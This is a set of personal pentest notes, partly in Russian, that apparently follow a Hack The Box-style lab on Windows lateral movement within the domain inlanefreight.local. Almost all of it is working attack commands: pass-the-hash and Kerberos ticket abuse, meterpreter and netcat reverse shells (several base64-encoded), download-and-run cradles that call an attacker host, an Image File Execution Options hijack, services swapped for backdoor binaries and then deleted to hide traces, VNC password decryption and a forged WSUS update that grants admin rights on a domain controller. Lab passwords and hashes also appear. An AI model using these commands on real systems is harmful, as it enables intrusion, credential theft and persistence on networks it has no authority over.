# Windows-Lateral-Movement

# RDP

    xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect 
    
    proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52

   *** Вход по билету TGT
   
    .\Rubeus.exe createnetonly /program:powershell.exe /show
    .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt
    mstsc.exe /restrictedAdmin

Windows Lateral Movement


xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.10.241 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect


mxdelta@htb[/htb]$ ./chisel server --reverse 

PS C:\Tools> .\chisel.exe client 10.10.15.30:8080 R:socks

mxdelta@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52

PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show

PS C:\Tools> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

PS C:\Tools> mstsc.exe /restrictedAdmin

mxdelta@htb[/htb]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s

.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88

wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs

PS C:\Tools> .\CleanRunMRU.exe  clearall


nxc smb 10.129.229.244 -u helen -p 'RedRiot88' --local-groups "Remote Desktop Users"
 Get-LocalGroupMember -Group "Remote Desktop Users"

ObjectClass Name                     PrincipalSource
----------- ----                     ---------------
User        INLANEFREIGHT\Crismerlin ActiveDirectory
User        INLANEFREIGHT\Helen      ActiveDirectory

SMB         10.129.229.244  445    SRV01            [+] inlanefreight.local\Crismerlin:RedRiot88 
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\Leonvqz:A35289033D176ABAAF6BEAA0AA681400 

PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show

PS C:\Tools> .\Rubeus.exe asktgt /user:Leonvqz /rc4:A35289033D176ABAAF6BEAA0AA681400 /domain:inlanefreight.local /ptt

PS C:\Tools> mstsc.exe /restrictedAdmin


Server Message Block (SMB)

xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

PSExec

.\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd		(выполнение и нтерактивной оболочки)

.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd   (выполнение с правами систем)



SharpNoPSExec.exe

https://github.com/juliourena/SharpNoPSExec.git
.\SharpNoPSExec.exe
.\SharpNoPSExec.exe --target=192.168.56.128 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="
.\SharpNoPSExec.exe --target=10.10.15.30 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxMC4xMC4xNS4zMCcsODA4MCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSI="
nc -lnvp 8080



Удаленный доступ к реестру
Reg.exe

sudo python3 smbserver.py -smb2support share .   (где лежит nc.exe)
mxdelta@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
reg.exe add "\\srv01.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

smbexec.py
proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52




# services

xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect

заходим на srv02
.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f	(разрешить гостевой доступ СМБ)


запускаем proxychains
mxdelta@htb[/htb]$ ./chisel server --reverse 

PS C:\Tools> .\chisel.exe client 10.10.15.30:8080 R:socks

запускаем smbcliеnt

 sudo impacket-smbserver share -smb2support ./
в котором лежит реверс шелл
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.30 LPORT=9001 -f exe-service -o rshell-9001.exe

ставим слушатель 
mxdelta@htb[/htb]$ nc -lnvp 9001


****Скрипт services.py интерфейс в Impacket взаимодействует со службами Windows, используя MSRPC . Он позволяет запускать, останавливать, удалять, считывать состояние, настраивать, отображать список, создавать и изменять службы.

proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list			(список служб)

Теперь мы можем выполнить команду для создания новой службы: 

proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.15.30\\share\\rshell-9001.exe" -start_type 2

или смены старой
Далее мы изменим путь к исполняемому файлу нашей полезной нагрузки и установим... START_TYPE к AUTO STARTс опцией -start_type 2:

proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name "VSS" -path "\\\\10.10.15.30\\share\\rshell-9001.exe" -start_type 2
proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name ALG -path "\\10.10.15.30\share\rshell-9001.exe" -start_type 2

*Мы можем просмотреть конфигурацию созданной пользовательской команды, используя config -name <serviceName>:

proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
                                                                
*Теперь мы можем начать обслуживание с start -name <serviceName>:

proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor' 
proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name VSS
proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name ALG 

Наконец, мы можем скрыть следы и удалить службу, набрав команду. delete -name <serviceName>:
 
mxdelta@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'



# Скрипт atexec.py использует службу планировщика задач Windows, доступ к которой осуществляется через atsvcSMB-канал

proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
nc -lnvp 8080



WMI

Получение информации о компьюьтере
wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version

Удаленно выполнять команды.
wmic /node:172.20.0.52 process call create "notepad.exe"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52

Кроме того, мы можем указать учетные данные внутри системы. wmicили PowerShell:

wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version

$credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52 -Credential $credential

получить сессию Metasploit с использованием WMI

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8001/s')" -ComputerName 172.20.0.52

msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.15.30; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.30 LPORT=8888 -f psh-reflection -o s
python3 -m http.server 8001

proxychains -q impacket-wmiexec inlanefreight/helen:RedRiot88@172.20.0.52 whoami  

proxychains4 -q nxc wmi 172.20.0.52 -u helen -p RedRiot88 --wmi-query "SELECT * FROM Win32_OperatingSystem"
proxychains4 -q nxc wmi 172.20.0.52 -u helen -p RedRiot88 -x "whoami"
proxychains4 -q nxc wmi 172.20.0.52 -u helen -p RedRiot88 --wmi-query "SELECT SerialNumber FROM Win32_OperatingSystem"
/

WIN-RM

xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux

* выполнение команд на удаленном пк
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }		

* с кредами

PS C:\Tools> $username = "INLANEFREIGHT\Helen"
PS C:\Tools> $password = "RedRiot88"
PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools> Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
  Если вместо имени компьютера используется IP-адрес, необходимо указать явные учетные данные, или же можно использовать флаг. -Authentication Negotiateвместо предоставления явных учетных данных.
  
* можноо использовать
winrs -r:srv02 "powershell -c whoami;hostname"

winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"

* Копирование файлов 

$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential

Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose
или наоборот
Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose

* Интерактивная оболочка

$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential
Enter-PSSession $sessionSRV02

Enter-PSSession srv02.inlanefreight.local

* Использование хешей и билетов с WinRM 

.\Rubeus.exe asktgt /user:leonvqz /rc4:3223DA033D176ABAAF6BEAA0AA681400 /nowrap
.\Rubeus.exe asktgt /user:leonvqz /rc4:A35289033D176ABAAF6BEAA0AA681400 /nowrap
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...

Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate
[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents> hostname
SRV02

!!!!Если мы не являемся администраторами, мы можем использовать явные учетные данные. -Credential или Invoke-Command


* Боковое перемещение из Linux

netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"

* Использование Evil-WinRM

evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093

???evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s './'

* Доступ к веб-интерфейсу Windows PowerShell 
http://10.129.229.244/pswa

еси занимает долго времени то можем кодировать в base64

PS C:\Tools> [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))   -- строк внутри кодируется в В64

В случае, если мы захотим использовать PowerView через PowerShell Web AccessВ результате может возникнуть следующая ошибка: 
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.87/PowerView.ps1')
PS C:\Tools> Get-DomainUser
$username = "INLANEFREIGHT\Helen"
PS C:\Tools> $password = "RedRiot88"
PS C:\Tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
PS C:\Tools> Get-DomainUser -Credential $credential -FindOne




Enter-PSSession DC01.inlanefreight.local -Authentication Negotiate
[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents> hostname


xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.10.241 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect
 ~/Downloads/chisel server --reverse 
 .\chisel.exe client 10.10.15.30:8080 R:socks
proxychains4 xfreerdp /v:172.20.0.52 /u:leonvqz /d:inlanefreight.local /pth:A35289033D176ABAAF6BEAA0AA681400 /cert:ignore

./Rubeus.exe asktgt /user:leonvqz /rc4:A35289033D176ABAAF6BEAA0AA681400 /domain:inlanefreight.local /dc:DC01.inlanefreight.local /nowrap
./Rubeus.exe ptt /ticket:
Invoke-Command -ComputerName DC01.inlanefreight.local -Authentication Kerberos -ScriptBlock {
  whoami
  Get-Content C:\Users\Leonvqz\Desktop\flag.txt
}
или

динамический прокси

netsh interface portproxy add v4tov4 listenport=15985 listenaddress=172.20.0.52 connectport=5985 connectaddress=172.20.0.10

netsh interface portproxy show v4tov4

proxychains4 -q evil-winrm -i 172.20.0.52 -P 15985 -u leonvqz -H A35289033D176ABAAF6BEAA0AA681400



# Распределенная компонентная объектная модель (DCOM) MMC20

~/Downloads/chisel server --reverse 
 .\chisel.exe client 10.10.15.158:8080 R:socks

nc -lnvp 8001
xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JExIT1NUID0gIjEwLjEwLjE1LjE1OCI7ICRMUE9SVCA9IDgwMDE7ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgkTEhPU1QsICRMUE9SVCk7ICROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTsgJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlci5BdXRvRmx1c2ggPSAkdHJ1ZTsgJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0OyB3aGlsZSAoJFRDUENsaWVudC5Db25uZWN0ZWQpIHsgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpIH07IGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgeyAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9OyAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsgJENvZGUgPSAkbnVsbCB9IH07ICRUQ1BDbGllbnQuQ2xvc2UoKTsgJE5ldHdvcmtTdHJlYW0uQ2xvc2UoKTsgJFN0cmVhbVJlYWRlci5DbG9zZSgpOyAkU3RyZWFtV3JpdGVyLkNsb3NlKCk=",0)

msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.15.158; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.158 LPORT=8888 -f psh-reflection -o s


proxychains4 -q python3 /usr/local/bin/dcomexec.py -object MMC20 \
  'INLANEFREIGHT/Helen:RedRiot88@172.20.0.52' \
  'cmd /c type C:\Users\helen\Documents\dcom.txt'
Q2 (Josias):

bash
Copy
proxychains4 -q python3 /usr/local/bin/dcomexec.py -object MMC20 \
  'INLANEFREIGHT/Josias:Jonny25@172.20.0.52' \
  'cmd /c type C:\Users\josias\Documents\dcom.txt'
  
***** Через REVERSE SHELL POWER SHELL
  
nc -lnvp 9001
   ***** Если нужго пересобрать адреса и порты
python3 - <<'EOF'
import base64
lhost, lport = "10.10.15.158", 9001   # <- поменяйте при необходимости
ps = ("$c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();"
      "[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){"
      "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
      "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
      "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()") % (lhost, lport)
print(base64.b64encode(ps.encode('utf-16-le')).decode())
EOF
 B64='JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQA1ADgAJwAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='

proxychains4 -q python3 /usr/local/bin/dcomexec.py -object MMC20 -silentcommand \
  'INLANEFREIGHT/Josias:Jonny25@172.20.0.52' \
  "powershell -nop -w hidden -e $B64"
  
#  Secure Shell (SSH) 
 ambiorisи пароль Ward@do9049.
 ssh -i C:\Users\ambioris\unknown_id_rsa -l helen@inlanefreight.local -p 2299 SRV02

**** из виндовс сканирование портов

1..10000 | ForEach-Object {
  $c = New-Object Net.Sockets.TcpClient
  try { if ($c.ConnectAsync('172.20.0.52',$_).Wait(120)) { $_ } } catch {} finally { $c.Close() }
}

**** проверка именно SSH
powershell -c "(New-Object Net.Sockets.TcpClient).ConnectAsync('172.20.0.52',2299).Wait(3000)"

*****Баннер (подтверждает, что это SSH):

powershell

$c = New-Object Net.Sockets.TcpClient('172.20.0.52',2299)
$s = $c.GetStream(); $b = New-Object byte[] 100
$s.Read($b,0,100) | Out-Null
[Text.Encoding]::ASCII.GetString($b).Trim()

*****Windows OpenSSH отказывается использовать ключ, если ACL слишком открытые, поэтому копируем ключ в свой профиль (наследуются права только SYSTEM/Administrators/твой пользователь):

copy /Y C:\Users\ambioris\.ssh\unknown_id_rsa C:\Users\ambioris\unknown_id_rsa
icacls C:\Users\ambioris\unknown_id_rsa

*****Проверено — после копирования:
C:\Windows\System32\icacls.exe C:\Users\ambioris\unknown_id_rsa
Get-Acl C:\Users\ambioris\unknown_id_rsa | Format-List

C:\Users\ambioris\unknown_id_rsa NT AUTHORITY\SYSTEM:(F)
                                 BUILTIN\Administrators:(F)
                                 INLANEFREIGHT\Ambioris:(F)
                                 
ssh -o StrictHostKeyChecking=no -i C:\Users\ambioris\unknown_id_rsa -l josias -p 2299 172.20.0.52

type C:\Users\josias\.ssh\flag.txt

# VNC

Test-NetConnection -ComputerName SRV02 -Port 5900

где хранятся ключи VNC
https://github.com/frizb/PasswordDecrypts
reg query HKLM\SOFTWARE\TightVNC\Server /s
раскодирую пароль VNC
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

VNCPass1

sudo apt-get install xtightvncviewer

echo VNCPass1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233

# Инструменты развертывания программного обеспечения и удаленного управления 

admin и пароль — RemoteManagement01

xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect

mxdelta@htb[/htb]$ ./chisel server --reverse 

PS C:\Tools> .\chisel.exe client 10.10.15.41:8080 R:socks

Перечисление MeshCentral 

nmap -p443 10.129.229.243 -sC -sV

## Служба обновления Windows Server (WSUS)

************** поиск WSUS
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
.\SharpWSUS.exe locate

filiplain и пароль Password1

xfreerdp /u:filiplain /p:'Password1' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect


Шаг 2. Создать поддельное обновление
На WSUS, в том же PowerShell (от администратора):

******************
cd C:\Tools
$out = .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"
$id = [regex]::Match(($out -join "`n"), 'updateid:([0-9a-fA-F-]{36})').Groups[1].Value
"UPDATE ID = $id"
**************

Что должно быть в выводе:------>>>>>>

знакомый баннер SharpWSUS
[*] Action: Create Update
Update Revision ID: <число>
в конце — МОЙ UPDATE ID = <GUID>, например a5a2731b-e94f-41e8-80e2-a500a4f31302

Шаг 3. Положить payload в папку контента WSUS и проверить
Правило WSUS: папка = последние 2 символа SHA1, имя файла = полный SHA1 + .exe. Плюс дополнительно кладём копию как wuagent.exe (этот путь WSUS прописывает как источник загрузки — из-за него в прошлый раз клиент не мог скачать).

Выполни одним блоком:

***********

$h = (Get-FileHash "C:\Tools\sysinternals\PsExec64.exe" -Algorithm SHA1).Hash
"payload SHA1 = $h"

$dest = "C:\WSUS\WsusContent\" + $h.Substring($h.Length-2) + "\" + $h + ".exe"
"основной путь: $dest"
New-Item -ItemType Directory -Force (Split-Path $dest) | Out-Null
Copy-Item "C:\Tools\sysinternals\PsExec64.exe" $dest -Force

Copy-Item "C:\Tools\sysinternals\PsExec64.exe" "C:\WSUS\WsusContent\wuagent.exe" -Force
"доп. путь:     C:\WSUS\WsusContent\wuagent.exe"

$rel = $dest.Substring("C:\WSUS\WsusContent\".Length) -replace '\\','/'
"HTTP основной  = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/$rel" -UseBasicParsing).StatusCode
"HTTP wuagent   = " + (Invoke-WebRequest "http://wsus.inlanefreight.local:8530/Content/wuagent.exe" -UseBasicParsing).StatusCode

*************
Что должно быть: --->>>

payload SHA1 = 0098C79E1404B4399BF0E686D88DBF052269A302
основной путь: C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
доп. путь:     C:\WSUS\WsusContent\wuagent.exe
HTTP основной  = 200
HTTP wuagent   = 200
Если SHA1 другой или HTTP не 200 — пришли вывод, разберёмся. Дальше Шаг 4 — проверка контента на стороне WSUS и одобрение.


Шаг 4. Проверить контент и одобрить обновление (через API, без ошибки duplicate key)
Выполни одним блоком:

**************************

[void][reflection.assembly]::LoadWithPartialName("Microsoft.UpdateServices.Administration")
$wsus = [Microsoft.UpdateServices.Administration.AdminProxy]::GetUpdateServer("WSUS",$false,8530)

# 1) заставить WSUS перепроверить контент
$wsus.ResetAndVerifyContentState()
$wsus.ResumeAllDownloads()
"failed downloads = " + $wsus.GetFailedToDownloadUpdatesCount()

# 2) группа + DC01 (с проверкой, поэтому без ошибок)
$groupName = "FastUpdates"
$g = $wsus.GetComputerTargetGroups() | Where-Object { $_.Name -eq $groupName }
if (-not $g) { $g = $wsus.CreateComputerTargetGroup($groupName); "группа '$groupName' СОЗДАНА" }
else        { "группа '$groupName' уже есть" }

$c = $wsus.GetComputerTargetByName("dc01.inlanefreight.local")
if (-not ($c.GetComputerTargetGroups() | Where-Object { $_.Id -eq $g.Id })) {
    $g.AddComputerTarget($c); "DC01 добавлен в группу"
} else { "DC01 уже в группе — пропускаем" }

# 3) одобрить с дедлайном в прошлом (форс установки)
$u = $wsus.GetUpdate([guid]$id)
$res = $u.Approve("Install", $g, (Get-Date).AddMinutes(-1))
"APPROVED action=" + $res.Action + " deadline=" + $res.Deadline

# 4) проверить, что одобрение записалось
"=== approvals ==="
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline -Auto

***************************

Что ожидаю увидеть:----->>>>>


failed downloads = 0
группа 'FastUpdates' уже есть          (или "СОЗДАНА", если её не было)
DC01 уже в группе — пропускаем          (или "DC01 добавлен в группу")
APPROVED action=Install deadline=10/7/2026 ...
=== approvals ===
Action  State  Deadline
------  -----  --------
Install Active 10/7/2026 ...



Шаг 5. Перепроверить состояние одобрения
Подожди ~45 секунд и выполни:

*************************

Start-Sleep 45
$u = $wsus.GetUpdate([guid]$id)
$u.GetUpdateApprovals() | Format-Table Action, State, Deadline, GoLiveTime -Auto

************************
Что ожидаю:

Copy
Action  State  Deadline              GoLiveTime
------  -----  --------              ----------
Install !!!!Active 10/7/2026 2:07:27 PM  10/7/2026 ...


Что ожидаю:

Copy
Action  State  Deadline              GoLiveTime
------  -----  --------              ----------
Install Active 10/7/2026 2:07:27 PM  10/7/2026 ...
